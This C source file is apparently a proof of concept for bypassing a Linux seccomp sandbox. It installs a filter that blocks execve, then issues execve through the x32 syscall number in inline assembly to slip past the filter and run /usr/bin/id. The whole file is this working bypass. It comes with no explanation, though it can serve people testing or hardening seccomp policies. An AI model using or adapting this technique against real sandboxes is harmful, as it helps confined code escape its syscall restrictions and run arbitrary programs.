/* compile with -m64 */
#include "seccomp-bpf.h"

static int install_syscall_filter(void)
{
	struct sock_filter filter[] = {
		VALIDATE_ARCHITECTURE,
		EXAMINE_SYSCALL,
		DISALLOW_SYSCALL(execve),
		CONTINUE_EXEC,
	};
	struct sock_fprog prog = {
		.len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
		.filter = filter,
	};

	if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)) {
		perror("prctl(SECCOMP)");
		goto failed;
	}
	return 0;

failed:
	if (errno == EINVAL)
		fprintf(stderr, "SECCOMP_FILTER is not available. :(\n");
	return 1;
}

char *path = "/usr/bin/id";
char *blah2[] = { "/usr/bin/id", NULL };

 int main(int argc, char *argv[])
 {
	if (install_syscall_filter())
		return 1;

	/* perform X32(not i386) execve */
	asm volatile (
		".intel_syntax noprefix\n"
		"mov rdi, path\n"
		"lea rsi, blah2\n"
		"xor rdx, rdx\n"
		"mov rax, 0x40000208\n"
		"syscall\n"
		".att_syntax noprefix\n"
	);

//	execl("/usr/bin/id", "/usr/bin/id", NULL);

	return 0;
}
